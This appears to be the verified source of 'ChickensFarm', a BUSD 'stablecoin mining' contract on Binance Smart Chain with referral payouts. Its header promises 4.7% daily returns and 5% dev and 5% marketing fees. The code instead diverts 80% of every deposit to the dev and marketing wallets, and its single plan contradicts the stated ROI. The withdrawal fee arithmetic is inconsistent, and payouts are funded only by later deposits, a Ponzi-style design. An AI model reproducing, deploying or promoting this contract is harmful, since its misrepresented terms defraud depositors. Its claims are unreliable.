/**
 *Submitted for verification at BscScan.com on 2022-06-28
*/

/**
 ^   https://chickensfarm.finance is a stablecoin mining dapp with invest back feature on Binance Smart Chain.
 ^   The smart contract released from the devs has been tested and reviewed internally for security bugs before deployment. There is no responsibility if there are unknown bugs in the mining logics.
 ^   The contract is decentralized, immutable once written in the blockchain. It works as a Community Contribution Pool with daily ROI and it's based on binance smart chain blockchain smart-contract technology. 
 ^   The sellEggs from the contract are paid with the main balance, coming from the deposits. The Smart Contract source is verified (public) and available to everyone. By partecipating you agree to the code rules.
 ^   The community of miners are the contract, they decide when the game must end. When the balance is zero the miners won't be able to sellEggs.
 ^
 ^   [USAGE INSTRUCTION]
 ^
 ^   1) Connect Dapp browser extension MetaMask, or mobile wallet apps like Trust Wallet
 ^   2) Contribute to the contract with any amount of BUSD required + Blockchain Fees
 ^   3) Wait for your earnings. sellEggs earnings (dividends) using our website "sellEggs" button.  First sellEggs when you have enough devidends
 ^   4) Invite your friends and earn some referral bonus
 ^   5) buy more Chickens if you want. You can also apply your personal re-buy Chickens strategy
 ^   6) Help the smart contract balance to grow and have fun. Remember to deposit only what you can afford to lose
 ^
 ^   Note: sellEggs only when you have a decent amount of dividends to save gas fee
 ^
 ^   [SMART CONTRACT FEATURES AND TECH DETAILS]
 ^
 ^   - ROI: base rate from 4.7% every 24 hours for every Buy Chicken
 ^   - No Minimum And Maximum Buy Chicken
 ^   - Single button sellEggs for dividends, No CUTOFF Limit
     - CUTOFF countdown means, after 1 day your profits pause until you sellEggs, then they resume.
 ^   
 ^   [REFERRAL SYSTEM TECH DETAILS]
 ^
 ^   - 5-level referral commission: 8% - 4% - 2% - 1% - 1%

 ^
 ^   [FUNDS DISTRIBUTION OF THE BUY CHICKEN]
 ^
 ^   - 84% Platform main balance, participants payouts, Referral (ROI). This is the miner balance.
 ^   - Partner Wallet: 1% of every Buy Chickens is sent automatically to our community partners.
 ^   - 5% Dev Fee (owner fee for PM, operating costs, miner support, promotions made in the Telegram Group)
 ^   - 5% Advertising and promotion expenses, big marketing expenses.
 ^   - 3% of all Buy Chicken go into GiveAway and Invest Back wallet which will reinvest in the contract And can also be Used for Poject GiveAway, contests + airdrops
 ^
 */
 
 // SPDX-License-Identifier: https://chickensfarm.finance

pragma solidity 0.6.12;

contract ChickensFarm {
    using SafeMath for uint256;

    address busd = 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7; // BUSD
    IBEP20 token;

    uint256 private constant INVEST_MIN_AMOUNT = 0.000000000000000001 ether; // No Minimum Deposit
    uint256[] private REFERRAL_PERCENTS = [80, 40, 20, 10, 10]; // Referral 8, 4, 2, 1, 1.
    uint256 private constant DEV_FEE = 800; // DevFee 5% MarketingFee 5%
    uint256 private constant GIVEAWAY_FEE = 40; // Project GiveAway And InvestBack
    uint256 private constant PARTNER_FEE = 30; // Project Partners
    uint256 private constant PERCENT_STEP = 5;
    uint256 private constant WID_FEE = 40;
    uint256 private constant WID_FEE2 = 40;
    uint256 private constant WID_FEE3 = 40;
    uint256 private constant WID_FEE4 = 30;
    uint256 private constant PERCENTS_DIVIDER = 1000;
    uint256 public constant TIME_STEP = 1 days;
    uint256 private constant CUTOFF_STEP = 9999999999999999999999 days; // No CutOff Limit
    uint256 private constant ANTI_WHALE = 20000000000000000000000 ether; // No Maximum Deposit

    uint256 public totalInvested;
    uint256 public totalReferralReward;
    
    mapping(uint8 => uint256) public numDeposits;
    mapping(uint8 => uint256) public amtDeposits;

    struct Plan {
      uint256 time;
      uint256 percent;
    }

    Plan[] internal plans;

    struct Deposit {
      uint8 plan;
      uint256 amount;
      uint256 start;
    }

    struct User {
      Deposit[] deposits;
      uint256 checkpoint;
      uint256 cutoff;
      address referrer;
      uint256[5] levels;
      uint256 bonus;
      uint256 totalBonus;
      uint256 withdrawn;
    }
    mapping(address => User) internal users;

    bool public started;
    address payable private devWallet;
    address payable private marketing;
    address payable private giveaway;
    address payable private investbackWallet;
    address payable private parner;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint8 plan, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);

    constructor() public {

      token = IBEP20(busd);
      devWallet = msg.sender;
      marketing = 0xdB492CfEb0A578B5c0d05bDABF998Dfc6654e964;
      giveaway = 0x8c0dd565d2eE3924f72920cC74E04697496A54C1;
      parner = 0x7Ae48C28AB759cc56B5D16B62Cab73f12E4ee006;

      plans.push(Plan(1, 10000)); // 4.7% for 30days = 210% total return
      plans.push(Plan(0, 0)); // 0
      plans.push(Plan(0, 0)); // 0
      plans.push(Plan(0, 0)); // 0
    }

    function layMarket() public {
      require(msg.sender == devWallet, "You can't do that");
      started = true;
    }

    function InvestBack(uint256 _amount) public payable {
      token.transferFrom(msg.sender, address(this), _amount);
    }

    function buyChicken(address _ref, uint8 plan, uint256 _amount) public payable {
      require(started, "Too early");
      require(plan < 4, "Invalid plan");
      require(_amount >= INVEST_MIN_AMOUNT, "Less than minimum amount");
      
      uint256 totalDeposits = getUserTotalDeposits(msg.sender);
      require(totalDeposits < ANTI_WHALE, "Deposit limit reached (200,000 BUSD)");

      token.transferFrom(msg.sender, address(this), _amount);
      
      numDeposits[plan] = numDeposits[plan] + 1;
      amtDeposits[plan] = amtDeposits[plan] + _amount;
      
      uint256 devFee = _amount.mul(DEV_FEE).div(PERCENTS_DIVIDER);
      uint256 devFee2 = devFee.div(2);
      uint256 giveawayFee = _amount.mul(GIVEAWAY_FEE).div(PERCENTS_DIVIDER);
      uint256 partnerFee = _amount.mul(PARTNER_FEE).div(PERCENTS_DIVIDER);

      token.transfer(devWallet, devFee2);
      token.transfer(marketing, devFee.sub(devFee2));
      token.transfer(giveaway, giveawayFee);
      token.transfer(parner, partnerFee);

      User storage user = users[msg.sender];

        if (user.referrer == address(0)) {
			if (users[_ref].deposits.length > 0) {
				user.referrer = _ref;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
                   users[upline].levels[i] =users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					uint256 amount = _amount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					totalReferralReward = totalReferralReward.add(amount);
					token.transfer(upline, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}

      if (user.deposits.length == 0) {
        user.checkpoint = block.timestamp;
        user.cutoff = block.timestamp.add(CUTOFF_STEP);
        emit Newbie(msg.sender);
      }

      user.deposits.push(Deposit(plan, _amount, block.timestamp));
      totalInvested = totalInvested.add(_amount);
      emit NewDeposit(msg.sender, plan, _amount);
    }
    

    function sellEggs() public {
      User storage user = users[msg.sender];
      uint256 totalAmount = getUserDividends(msg.sender);

      uint256 fee = totalAmount.mul(WID_FEE).div(PERCENTS_DIVIDER);
      uint256 fee2 = totalAmount.mul(WID_FEE2).div(PERCENTS_DIVIDER);
      uint256 giv = totalAmount.mul(WID_FEE3).div(PERCENTS_DIVIDER);
      uint256 mark = totalAmount.mul(WID_FEE4).div(PERCENTS_DIVIDER);


      require(totalAmount > 0, "User has no dividends");

      uint256 contractBalance = token.balanceOf(address(this));
      if (contractBalance < totalAmount) {
			  user.bonus = totalAmount.sub(contractBalance);
			  user.totalBonus = user.totalBonus.add(user.bonus);
			  totalAmount = contractBalance;
      }

      user.checkpoint = block.timestamp;
      user.cutoff = block.timestamp.add(CUTOFF_STEP);
      user.withdrawn = user.withdrawn.add(totalAmount);
      token.transfer(devWallet, fee2);
      token.transfer(marketing, fee);
      token.transfer(giveaway, giv);
      token.transfer(parner, mark);
      token.transfer(msg.sender, SafeMath.sub(totalAmount,(fee+fee2+giv)));
    }

    function getContractBalance() public view returns (uint256) {
      return token.balanceOf(address(this));
    }

    function getPlanInfo(uint8 plan) public view returns (uint256 time, uint256 percent) {
      time = plans[plan].time;
      percent = plans[plan].percent;
    }

    function getUserDividends(address userAddress) public view returns (uint256) {
      User storage user = users[userAddress];
      uint256 totalAmount = 0;
      
      uint256 endPoint = block.timestamp < user.cutoff ? block.timestamp : user.cutoff;

      for (uint256 i = 0; i < user.deposits.length; i++) {
	    uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(1 days));
		if (user.checkpoint < finish) {
		  uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
		  uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
		  uint256 to = finish < endPoint ? finish : endPoint;
		  if (from < to) {
		    totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
		  }
		}
      }
      return totalAmount;
	}

    function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
      return users[userAddress].withdrawn;
    }

    function getUserCheckpoint(address userAddress) public view returns (uint256) {
      return users[userAddress].checkpoint;
    }

    function getUserReferrer(address userAddress) public view returns (address) {
      return users[userAddress].referrer;
    }

    function getUserDownlineCount(address userAddress) public view returns (uint256[5] memory referrals) {
      return (users[userAddress].levels);
    }

    function getUserTotalReferrals(address userAddress) public view returns (uint256) {
      return users[userAddress].levels[0] + users[userAddress].levels[1] + users[userAddress].levels[2] + users[userAddress].levels[3] + users[userAddress].levels[4];
    }

    function getUserReferralBonus(address userAddress) public view returns (uint256) {
      return users[userAddress].bonus;
    }

    function getUserReferralTotalBonus(address userAddress) public view returns (uint256) {
      return users[userAddress].totalBonus;
    }

    function getUserReferralWithdrawn(address userAddress) public view returns (uint256) {
      return users[userAddress].totalBonus.sub(users[userAddress].bonus);
    }

    function getUserAvailable(address userAddress) public view returns (uint256) {
      return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint256) {
     return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint256 amount) {
      for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
        amount = amount.add(users[userAddress].deposits[i].amount);
      }
    }

    function getUserDepositInfo(address userAddress, uint256 index) public view returns (uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
      User storage user = users[userAddress];

      plan = user.deposits[index].plan;
      percent = plans[plan].percent;
      amount = user.deposits[index].amount;
      start = user.deposits[index].start;
      finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(1 days));
    }

    function getSiteInfo() public view returns (uint256 _totalInvested, uint256 _totalBonus) {
      return (totalInvested, totalReferralReward);
    }

    function getUserInfo(address userAddress) public view returns (uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
      return (getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
    }
    
    function getUserCutoff(address userAddress) public view returns (uint256) {
      return users[userAddress].cutoff;
    }

    function isContract(address addr) internal view returns (bool) {
      uint256 size;
      assembly { size := extcodesize(addr) }
      return size > 0;
    }
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a, "SafeMath: subtraction overflow");
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
        return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0, "SafeMath: division by zero");
    uint256 c = a / b;
    return c;
  }
}

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}